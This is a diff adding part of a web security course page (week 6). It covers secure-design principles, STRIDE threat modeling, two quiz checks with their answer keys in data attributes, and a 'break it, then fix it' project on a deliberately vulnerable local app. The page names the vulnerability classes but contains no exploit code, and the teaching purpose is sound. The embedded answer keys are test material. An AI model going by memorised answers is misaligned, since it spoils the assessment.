+      <li><b>Least privilege.</b> The web app's database user shouldn't be able to drop tables; a service shouldn't run as root; an API key should only have the permissions its job needs.</li>
+      <li><b>Defense in depth.</b> Layer protections (parameterized queries <i>and</i> a least-privilege database user; output escaping <i>and</i> a Content-Security-Policy) so one mistake isn't fatal.</li>
+      <li><b>Secure defaults.</b> Prefer frameworks and settings where the safe behavior happens automatically and the unsafe one needs an explicit opt-out.</li>
+      <li><b>Keep secrets out of code.</b> Use environment variables or a secret manager, never commit them to git (history keeps them forever), and rotate any secret that leaks.</li>
+      <li><b>Keep dependencies updated</b>, and use tools that alert you to known vulnerabilities in them.</li>
+      <li><b>Log security events</b> (logins, permission failures, password changes) without logging secrets like passwords or tokens.</li>
+    </ul>
+
+    <h3>Threat modeling</h3>
+    <p>Before building a feature, spend ten minutes asking four questions: <b>What are we building? What can go wrong? What are we going to do about it? Did we do a good job?</b> The <b>STRIDE</b> checklist helps with the second: <b>S</b>poofing identity, <b>T</b>ampering with data, <b>R</b>epudiation (denying an action), <b>I</b>nformation disclosure, <b>D</b>enial of service, <b>E</b>levation of privilege. A password reset feature, for example, has obvious spoofing risks (can someone reset another user's password?), information disclosure risks (does the response reveal whether an email is registered?) and denial-of-service risks (can someone flood a user with reset emails?).</p>
+
+    <div class="check" data-id="w6-c13" data-answer="2">
+      <p class="check-q">After a successful login, an app keeps using the session ID the browser already had before logging in. Why is that risky?</p>
+      <ol class="check-o"><li>Session IDs must change every request</li><li>It makes login slower</li><li>An attacker who planted or knew the pre-login session ID (session fixation) is now logged in as the user too; a fresh ID at login prevents this</li><li>It isn't risky</li></ol>
+      <div class="check-why">Always issue a new session identifier when privilege changes, especially at login.</div>
+    </div>
+    <div class="check" data-id="w6-c14" data-answer="0">
+      <p class="check-q">Why are passkeys and hardware security keys resistant to phishing, while authenticator-app codes aren't?</p>
+      <ol class="check-o"><li>The browser binds the key's response to the real site's origin, so a look-alike phishing domain gets nothing it can replay; a 6-digit code can be typed into a fake site and relayed in real time</li><li>Passkeys are longer than codes</li><li>Hardware keys can't be lost</li><li>Authenticator codes are sent over SMS</li></ol>
+      <div class="check-why">Origin binding is the key property. That's why security teams increasingly push for passkeys or hardware keys for sensitive accounts.</div>
+    </div>
+
+    <div class="videos">
+      <a class="video" href="https://www.youtube.com/watch?v=bPVaOlJ6ln0" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/bPVaOlJ6ln0/mqdefault.jpg" alt="" loading="lazy"><span><b>Cybersecurity</b><small>Crash Course Computer Science #31</small></span></a>
+      <a class="video" href="https://www.youtube.com/watch?v=ZXFYT-BG2So" target="_blank" rel="noopener"><img src="https://i.ytimg.com/vi/ZXFYT-BG2So/mqdefault.jpg" alt="" loading="lazy"><span><b>2FA: Two Factor Authentication</b><small>Computerphile</small></span></a>
+    </div>
+
+    <div class="note-box"><strong>Week 6 in one paragraph</strong><p>HTTP is stateless text over TCP: methods with clear semantics, status codes that tell you who failed, cookies for state and headers for caching. Browsers isolate origins, and CORS lets servers relax that for reads. Encoding isn't security; hashes fingerprint, HMACs authenticate, authenticated encryption keeps secrets, and passwords need slow salted hashes. Public keys and Diffie–Hellman bootstrap TLS, certificates prove who's on the other end, and ephemeral keys give forward secrecy. Most web vulnerabilities come from treating untrusted input as code or authority, so use parameterized queries, escape output, check CSRF tokens, contain file paths and authorize every request. Then build defense in depth on top.</p></div>
+  </section>
+
+  <!-- ===================== Project ===================== -->
+  <section class="project" id="project">
+    <span class="eyebrow">Mini-project · 4–5 hours</span>
+    <h2>Break it, then fix it: a vulnerable web app</h2>
+    <p>You get a small message-board-and-wallet web app with seven deliberate security holes: SQL injection, plaintext passwords, a forgeable session cookie, stored XSS, CSRF, path traversal and a business-logic bug. <b>Part 1:</b> write working exploits for each hole, verified by tests against an untouched copy of the app. <b>Part 2:</b> fix every hole in your copy, so the same exploits (and a set of standard attacks) fail, while normal use still works.</p>
+    <p><b>Where:</b> <code>syllabus/projects/week-06-secure-app/</code>. Read its <code>README.md</code> first. The app only listens on <code>127.0.0.1</code>.</p>
+    <pre class="code"><code>cd syllabus/projects/week-06-secure-app
+python -m unittest test_exploits -v     <span class="c"># part 1: your attacks work on the original</span>
+python -m unittest test_security -v     <span class="c"># part 2: your fixed app blocks them</span>
+python -m unittest test_features -v     <span class="c"># and still works normally</span>
+python run_app.py                       <span class="c"># try it in a browser at http://127.0.0.1:8001</span></code></pre>
+    <p><b>Deliverables</b></p>
+    <ol class="deliverables">
+      <li>Seven exploits in <code>exploits.py</code>, passing <code>test_exploits</code></li>
+      <li>All seven holes fixed in <code>app.py</code>, passing <code>test_security</code> and <code>test_features</code></li>
+      <li>A short write-up of each vulnerability in <code>FINDINGS.md</code> (template provided)</li>
+      <li>A commit with your work, plus your status and notes below</li>
+    </ol>
+    <div id="project-tracker"></div>
+  </section>
+
+  <section class="quiz-block" id="quiz">
+    <span class="eyebrow">End-of-week quiz · 30 minutes</span>
+    <h2>Week 6 quiz</h2>
+    <p>15 questions covering all six lessons. Score 70% to pass. Take it after the project, without notes.</p>
+    <div class="row"><a class="btn primary" href="../quizzes/week-06.html">Open the quiz</a><span class="small muted">Status: <span id="quiz-status">checking…</span></span></div>
+  </section>
+
+  <section class="reflection" id="reflection">
+    <span class="eyebrow">Self-rating and reflection · 15 minutes</span>
+    <h2>How did this week go?</h2>
+    <p>Rate yourself on each objective, then note what clicked and what didn't. This goes into <code>results/REPORT.md</code>.</p>
+    <div id="reflection-form"></div>
+  </section>
+
+  <footer class="foot"><span class="sync-slot"></span><div class="row"><a class="btn ghost" href="week-05.html">← Week 5</a><a class="btn" href="../index.html">Back to the syllabus</a></div></footer>
+</div>
+<script src="../data/plan.js"></script>
+<script>window.SYLLABUS_WEEK = 6;</script>
+<script src="../../assets/syllabus.js"></script>
+</body>
+</html>
